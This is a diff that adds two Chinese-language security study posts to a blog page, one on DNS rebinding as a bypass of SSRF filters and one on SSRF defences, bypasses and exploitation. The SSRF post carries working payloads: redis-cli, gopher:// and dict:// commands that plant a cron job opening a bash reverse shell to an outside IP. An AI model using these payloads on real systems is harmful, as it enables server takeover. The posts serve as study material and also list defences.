@@ -1502,6 +1502,379 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/05/22/dns-rebinding/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/22/dns-rebinding/" itemprop="url">DNS Rebinding</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-22T17:47:19+08:00">
+                2020-05-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="DNS-TTL"><a href="#DNS-TTL" class="headerlink" title="DNS TTL"></a>DNS TTL</h3><p>TTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。</p>
+<p>当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。</p>
+<h5 id="常见的设置TTL值的场景"><a href="#常见的设置TTL值的场景" class="headerlink" title="常见的设置TTL值的场景"></a>常见的设置TTL值的场景</h5><ol>
+<li>增大TTL值，以节约域名解析时间</li>
+<li>减小TTL值，减少更新域名记录时的不可访问时间</li>
+</ol>
+<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>原理就是上面的第二种，设置一个非常小的TTL值，让客户端发出的两次请求获得的解析结果不同。</p>
+<p>常见ssrf防御场景：</p>
+<p>php的waf做判断的时候，第一次会解析域名的ip，然后判断这个ip是不是内网ip，如果不是内网ip的时候，再去真正用curl请求这个域名。</p>
+<p>这就牵涉到了，curl请求这个域名会做第二次域名解析，重新对dns服务器进行请求，获得到一个内网ip，这时候就是绕过限制请求到了内网资源。</p>
+<p>当然需要ttl设置为0</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652852236&idx=1&sn=e95f715b513c1deaded7258d9077607f&scene=21#wechat_redirect">示例代码：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$dst = @$_GET[&#x27;KR&#x27;];</span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[&#x27;host&#x27;], DNS_A)[0][&#x27;ip&#x27;];</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$dev_ip = &quot;54.87.54.87&quot;;</span><br><span class="line"></span><br><span class="line">if($ip === $dev_ip) &#123;</span><br><span class="line"></span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line"></span><br><span class="line">    echo $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">dns rebinding测试网站提供的域名</a>（测试不太好使，解析不到该域名，待研究），随机返回两个ip地址。（使用时应该需要多测几遍）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">$ host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<h4 id="http-rbnd-gl0-eu-dnsbin"><a href="#http-rbnd-gl0-eu-dnsbin" class="headerlink" title="http://rbnd.gl0.eu/dnsbin"></a><a target="_blank" rel="noopener" href="http://rbnd.gl0.eu/dnsbin">http://rbnd.gl0.eu/dnsbin</a></h4><p><img src="1.jpg" alt="image"></p>
+<p>在record中设置要解析的ip地址，submit后会自动生成一个domain。解析这个domain就会得到填写的ip地址。</p>
+<p><img src="2.jpg" alt="image"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/12/04/ssrf-referrence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/04/ssrf-referrence/" itemprop="url">SSRF笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-04T16:32:57+08:00">
+                2019-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>SSRF是一种常见的Web漏洞，通常存在于需要请求外部内容的逻辑中，比如本地化网络图片、XML解析时的外部实体注入、软件的离线下载等。当攻击者传入一个未经验证的URL，后端代码直接请求这个URL，将会造成SSRF漏洞。</p>
+<h2 id="常见ssrf防御及绕过"><a href="#常见ssrf防御及绕过" class="headerlink" title="常见ssrf防御及绕过"></a><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">常见ssrf防御及绕过</a></h2><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>检查请求url中的host不为内网ip即可。具体实现：</p>
+<ol>
+<li>解析目标URL，获取其Host</li>
+<li>解析Host，获取Host指向的IP地址</li>
+<li>检查IP地址是否为内网IP</li>
+<li>请求URL</li>
+<li>如果有跳转，拿出跳转URL，执行1</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.0/16 =&gt; 192.168.0.0 ~ 192.168.255.255</span><br><span class="line">10.0.0.0/8 =&gt; 10.0.0.0 ~ 10.255.255.255</span><br><span class="line">172.16.0.0/12 =&gt; 172.16.0.0 ~ 172.31.255.255</span><br><span class="line">127.0.0.0/8</span><br><span class="line">0.0.0.0/8</span><br></pre></td></tr></table></figure>
+<p>PHP代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function check_ip($url)&#123; //检查是否是内网ip范围——方法一</span><br><span class="line"></span><br><span class="line">	if( ip2long($url) &gt;= ip2long(&#x27;127.0.0.0&#x27;) &amp;&amp; ip2long(&#x27;127.255.255.255&#x27;) &gt;= ip2long($url) )&#123;</span><br><span class="line"></span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;= ip2long(&#x27;172.16.0.0&#x27;) &amp;&amp; ip2long($url) &lt;= ip2long(&#x27;172.31.255.255&#x27;))&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;= ip2long(&#x27;10.0.0.0&#x27;) &amp;&amp; ip2long($url) &lt;= ip2long(&#x27;10.255.255.255&#x27;))&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;= ip2long(&#x27;192.168.0.0&#x27;) &amp;&amp; ip2long($url) &lt;= ip2long(&#x27;192.168.255.255&#x27;))&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) == ip2long(&#x27;0.0.0.0&#x27;))&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &#x27;outer ip&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_ip2($url)&#123;//检查是否是内网ip范围——方法二</span><br><span class="line"></span><br><span class="line">	if (ip2long($url) &gt;&gt; 24 == ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24)&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;&gt; 24 == ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24)&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;&gt; 16 == ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 16)&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;&gt; 16 == ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16)&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else if(ip2long($url) &gt;&gt; 24 == ip2long(&#x27;0.0.0.0&#x27;) &gt;&gt; 24)&#123;</span><br><span class="line">		echo &#x27;inner ip&#x27;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &#x27;outer ip&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_hostname($url)&#123; //获取url中的hostname</span><br><span class="line">	$url_parse=parse_url($url); </span><br><span class="line">	$hostname=$url_parse[&#x27;host&#x27;]; </span><br><span class="line">	return $hostname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h6 id="1-绕过host获取"><a href="#1-绕过host获取" class="headerlink" title="1. 绕过host获取"></a>1. 绕过host获取</h6><ol>
+<li><a target="_blank" rel="noopener" href="http://233.233.233.233@10.0.0.1:8080/">http://233.233.233.233@10.0.0.1:8080/</a></li>
+<li><a target="_blank" rel="noopener" href="http://10.0.0.1/#233.233.233.233">http://10.0.0.1#233.233.233.233</a></li>
+</ol>
+<h6 id="2-绕过IP地址检查"><a href="#2-绕过IP地址检查" class="headerlink" title="2. 绕过IP地址检查"></a>2. 绕过IP地址检查</h6><ol>
+<li>利用八进制IP地址绕过</li>
+<li>利用十六进制IP地址绕过</li>
+<li>利用十进制的IP地址绕过</li>
+<li>利用IP地址的省略写法绕过</li>
+<li>0.0.0.0</li>
+</ol>
+<h6 id="3-控制域名解析"><a href="#3-控制域名解析" class="headerlink" title="3. 控制域名解析"></a>3. 控制域名解析</h6><p>使用这个神奇的域名xip.io可以将解析到任意ip地址，使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">D:\libnum (master -&gt; origin)                              </span><br><span class="line">λ ping 127.0.0.1.xip.io                                   </span><br><span class="line">                                                          </span><br><span class="line">正在 Ping 127.0.0.1.xip.io [127.0.0.1] 具有 32 字节的数据:         </span><br><span class="line">来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128                    </span><br><span class="line">来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128                    </span><br><span class="line">来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128                    </span><br><span class="line">来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128                    </span><br><span class="line">                                                          </span><br><span class="line">127.0.0.1 的 Ping 统计信息:                                    </span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，                  </span><br><span class="line">往返行程的估计时间(以毫秒为单位):                                        </span><br><span class="line">    最短 = 0ms，最长 = 0ms，平均 = 0ms                            </span><br></pre></td></tr></table></figure>
+
+<h6 id="4-使用302跳转返回内网地址"><a href="#4-使用302跳转返回内网地址" class="headerlink" title="4. 使用302跳转返回内网地址"></a>4. 使用302跳转返回内网地址</h6><p>输入的是一个外网地址，该地址服务器返回302状态码，location是内网ip如127.0.0.1。此时如果curl没有设置“禁止重定向”的话就会向重定向地址发出请求。</p>
+<h6 id="5-dns-rebinding"><a href="#5-dns-rebinding" class="headerlink" title="5. dns rebinding"></a>5. dns rebinding</h6><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>1.内外网的端口和服务扫描</p>
+<p>2.[主机本地敏感数据的读取(<a target="_blank" rel="noopener" href="https://www.codercto.com/a/59762.html">https://www.codercto.com/a/59762.html</a>)</p>
+<p>3.内外网主机应用程序漏洞的利用（gopher）</p>
+<p>4.内外网Web站点漏洞的利用</p>
+<p>curl支持的协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost :curl -V</span><br><span class="line">curl 7.54.0 (x86_64-apple-darwin17.0) libcurl/7.54.0 LibreSSL/2.0.20 zlib/1.2.11 nghttp2/1.24.0</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line">Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/86625476">gopher协议 攻击redis</a></p>
+<p> url=gopher://127.0.0.1:6379/info</p>
+<p> 攻击redis常用exp：（反弹shell至134.175.2.34的2333端口）</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 134.175.2.34 -p 6378 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/134.175.2.34/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h 134.175.2.34 -p 6378 -x set 1</span><br><span class="line">redis-cli -h 134.175.2.34 -p 6378 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h 134.175.2.34 -p 6378 config set dbfilename root</span><br><span class="line">redis-cli -h 134.175.2.34 -p 6378 save</span><br></pre></td></tr></table></figure>
+<p> gopher协议exp：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://134.175.2.34:6378/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/134.175.2.34/23333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+<p> 将exp urlencode后在ssrf中使用：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/ssrf.php?url=gopher://134.175.2.34:6378/_*1%25%30%64%25%30%61%24%38%25%30%64%25%30%61%66%6c%75%73%68%61%6c%6c%25%30%64%25%30%61%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%25%30%64%25%30%61%31%25%30%64%25%30%61%24%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%30%61%25%30%61%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%33%34%2e%31%37%35%2e%32%2e%33%34%2f%32%33%33%33%33%20%30%3e%26%31%25%30%61%25%30%61%25%30%61%25%30%61%25%30%61%25%30%64%25%30%61%25%30%64%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%31%36%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61%71%75%69%74%25%30%64%25%30%61</span><br></pre></td></tr></table></figure>
+<p> curl直接发起gopher攻击：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#x27;gopher://134.175.2.34:6378/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/134.175.2.34/23333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>dict攻击redis</p>
+<p> dict://127.0.0.1:6379/info</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tools.php?a=s&amp;u=dict://www.x.cn:6379/config:set:dir:/var/spool/cron/</span><br><span class="line"></span><br><span class="line">tools.php?a=s&amp;u=dict://www.x.cn:6379/config:set:dbfilename:root</span><br><span class="line"></span><br><span class="line">tools.php?a=s&amp;u=dict://www.x.cn:6379/set:0:&quot;\x0a\x0a*/1\x20*\x20*\x20*\x20*\x20/bin/bash\x20-i\x20&gt;\x26\x20/dev/tcp/vps/8888\x200&gt;\x261\x0a\x0a\x0a&quot;</span><br><span class="line"></span><br><span class="line">tools.php?a=s&amp;u=dict://www.x.cn:6379/save</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>遇到无回显ssrf怎么办</p>
+<ol>
+<li>测试输入，看是否为Bool型。Bool型SSRF是根据返回包中的state进行判断，当state为”远程连接出错”或者为“SUCCESS”时表示该主机存在，且对应的端口为开放状态。</li>
+<li>dnslog</li>
+</ol>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ol>
+<li><p>禁止跳转</p>
+</li>
+<li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+</li>
+<li><p>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
+</li>
+<li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
+</li>
+<li><p>限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
+</li>
+<li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+</li>
+</ol>
+<p>参考链接</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6373">SSRF在有无回显方面的利用及其思考与总结</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/20/sql-injection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1785,7 +2158,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
